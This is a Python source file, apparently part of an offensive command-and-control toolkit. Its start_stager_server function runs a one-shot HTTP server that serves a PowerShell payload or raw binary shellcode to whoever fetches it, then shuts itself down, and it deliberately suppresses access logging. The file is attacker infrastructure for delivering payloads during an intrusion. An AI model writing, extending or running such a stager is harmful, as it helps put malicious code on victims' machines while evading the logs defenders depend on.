import threading
from http.server import HTTPServer, BaseHTTPRequestHandler
from socketserver import ThreadingMixIn
from colorama import init, Fore, Style

brightgreen = "\001" + Style.BRIGHT + Fore.GREEN + "\002"
brightyellow = "\001" + Style.BRIGHT + Fore.YELLOW + "\002"
brightred = "\001" + Style.BRIGHT + Fore.RED + "\002"
brightblue = "\001" + Style.BRIGHT + Fore.BLUE + "\002"


class ThreadingHTTPServer(ThreadingMixIn, HTTPServer):
    daemon_threads = True

def start_stager_server(port, payload, format='ps1', ip="0.0.0.0"):

    class _OneShotHandler(BaseHTTPRequestHandler):
        def do_GET(self):
            if format.lower() == 'ps1' and self.path == '/payload.ps1':
                self.send_response(200)
                self.send_header('Content-Type', 'text/plain; charset=utf-8')
                self.end_headers()
                self.wfile.write(payload.encode('utf-8'))
                # shut down the server once the payload has been served
                threading.Thread(target=self.server.shutdown, daemon=True).start()

            # Raw binary shellcode
            elif format.lower() == 'bin' and self.path == '/payload.bin':
                self.send_response(200)
                self.send_header('Content-Type', 'application/octet-stream')
                self.send_header('Content-Length', str(len(payload)))
                self.end_headers()
                self.wfile.write(payload)

                # shutdown after serving once
                threading.Thread(target=self.server.shutdown, daemon=True).start()

            else:
                self.send_response(404)
                self.end_headers()

        def log_message(self, format, *args):
            # suppress access logs
            return


    server = ThreadingHTTPServer((ip, port), _OneShotHandler)
    t = threading.Thread(target=server.serve_forever, daemon=True)
    t.start()